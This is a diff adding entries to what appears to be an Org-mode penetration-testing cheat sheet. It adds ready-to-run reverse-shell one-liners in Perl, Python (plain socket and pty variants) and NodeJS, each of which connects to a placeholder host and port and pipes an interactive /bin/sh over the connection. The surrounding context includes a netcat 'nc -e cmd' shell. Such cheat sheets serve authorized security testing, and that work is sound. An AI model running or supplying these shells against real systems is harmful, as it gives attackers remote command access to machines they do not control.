@@ -3714,6 +3714,39 @@
        #+begin_src bat
          cmd.exe /c nc.exe <ip> <port> -e cmd
        #+end_src
+** Perl
+   - Spawning a system shell oneliner
+     #+begin_src sh
+       perl -MSocket -e 'socket+S,2,1,6;connect+S,sockaddr_in+<port>,inet_aton"<ip-host>"or+die;open+STDIN,">&S";open+STDOUT,">&S";open+STDERR,">&S";exec"/bin/sh -i"'
+     #+end_src
+** Python
+*** Socket
+    - Spawning a system shell oneliner
+      #+begin_src sh
+        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip-host>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+      #+end_src
+    - Spawning a system shell with pty
+      #+begin_src python
+        import socket
+        import os
+        import pty
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("<ip-host>", <port>))
+
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+
+        pty.spawn("/bin/sh")
+      #+end_src
+** NodeJS
+    - Spawning a system shell
+      #+begin_src sh
+        node -e '(function(){var sh = require("child_process").spawn("/bin/sh", []), cli = new require("net").Socket(); cli.connect(<port>, "<ip-host>", function(){cli.pipe(sh.stdin); sh.stdout.pipe(cli); sh.stderr.pipe(cli);}); return /a/;})();'
+        # Set require is not there by default:
+        # var r=global.process.mainModule.require
+      #+end_src
 
 * System Enumeration
 ** Linux
